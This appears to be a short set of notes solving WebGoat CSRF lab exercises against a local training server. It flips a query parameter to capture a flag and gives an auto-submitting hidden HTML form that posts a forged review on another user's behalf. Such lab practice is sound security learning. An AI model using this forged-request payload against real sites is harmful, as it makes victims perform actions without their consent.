### CSRF Exercise
submit query goes to = 'http://127.0.0.1:8080/WebGoat/csrf/basic-get-flag?csrf=false&submit=Submit+Query'
on setting csrf=true we get flag
### Post a review on someone else’s behalf
just make an html page with form
```
<body onload="document.getElementById('csrf-review').submit();">
	<form accept-charset="UNKNOWN" id="csrf-review" method="POST" name="review-form" successcallback="" action="http://127.0.0.1:8080/WebGoat/csrf/review">
       <input type="hidden" class="form-control" id="reviewText" name="reviewText" placeholder="Add a Review" type="text" value="bad review">
       <input type="hidden" class="form-control" id="reviewStars" name="stars" type="text" value=3>
       <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
  </form>
</body>
```
